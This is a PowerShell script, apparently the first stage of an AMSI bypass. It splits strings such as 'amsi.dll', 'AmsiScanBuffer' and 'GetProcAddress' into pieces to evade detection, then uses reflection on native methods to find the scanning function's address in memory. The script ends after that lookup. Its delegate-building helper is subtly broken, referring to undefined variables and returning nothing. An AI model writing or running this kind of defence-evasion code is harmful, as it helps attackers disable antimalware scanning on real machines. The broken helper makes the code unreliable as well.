function GetAddress($m, $f) {
    $sA = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {$_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'Sy' + 'ste' + 'm.dll'}

    $uNM = ForEach ($t in $sA.GetTypes()) {
        $t | Where-Object {$_.FullName -like '*Nati' + 'veM' + 'ethods' -and $_.Fullname -like '*Win32*' -and $_.Fullname -like '*Un*'}
    }

    $mH = $uNM.GetMethods() | Where-Object {$_.Name -like '*Handle' -and $_.Name -like '*Module*'} | Select-Object -First 1
    $pA = $uNM.GetMethod('Ge' + 'tPro' + 'cAdd' + 'ress', [type[]]('IntPtr', 'System.String'))

    $m = $mH.Invoke($null, @($m))
    $pA.Invoke($null, @($m, $f))
}

function GetType($f, $dT = [Void]) {
    $t = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

    $t.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $t.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
}

$a = "a" + "ms" + "i" + "." + "dll"
$b =  $a.Substring(0, 1).ToUpper() + $a.Substring(1, 3) + "Sc" + "an" + "Bu" + "ff" + "er"
$ab = GetAddress $a $b
